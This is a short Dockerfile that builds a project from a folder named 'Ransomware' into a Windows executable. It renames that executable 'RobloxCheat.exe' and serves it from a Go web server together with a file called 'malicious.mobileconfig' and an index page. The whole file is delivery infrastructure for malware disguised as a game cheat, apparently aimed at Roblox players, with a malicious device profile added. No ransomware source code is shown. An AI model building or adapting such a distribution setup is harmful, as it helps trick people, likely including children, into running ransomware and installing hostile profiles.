# Dockerfile
FROM rust:1.75 AS rust-builder

WORKDIR /app
COPY Ransomware/ .
RUN rustup target add x86_64-pc-windows-gnu
RUN apt-get update && apt-get install -y mingw-w64
RUN cargo build --release --target x86_64-pc-windows-gnu

FROM golang:1.21 AS go-builder

WORKDIR /app
COPY go.mod ./
COPY main.go ./
RUN go mod tidy
RUN go mod download
RUN go build -o server

FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --from=go-builder /app/server .
COPY --from=rust-builder /app/target/x86_64-pc-windows-gnu/release/roblox-cheat.exe ./RobloxCheat.exe
COPY malicious.mobileconfig .
COPY index.html .

EXPOSE 8080

CMD ["./server"]
